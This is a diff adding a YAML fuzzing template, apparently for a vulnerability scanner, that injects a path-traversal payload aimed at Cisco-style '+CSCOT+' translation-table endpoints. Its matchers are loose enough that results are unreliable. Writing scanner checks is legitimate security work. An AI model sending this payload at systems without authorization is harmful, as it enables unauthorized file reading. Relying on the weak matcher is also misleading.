@@ -1,0 +1,40 @@
+id: fuzz-path-traversal
+
+info:
+  name: Path Traversal Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is specifically crafted to detect potential path traversal vulnerabilities using a custom payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only for GET requests
+
+    payloads:
+      ptrav:
+        - "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: path
+        type: replace
+        mode: single
+        fuzz:
+          - "{{ptrav}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "error"   # Look for specific error messages or patterns
+
+      - type: status
+        status:
+          - 200
+          - 403
+          - 404        # Indicating potential path traversal errors or access issues
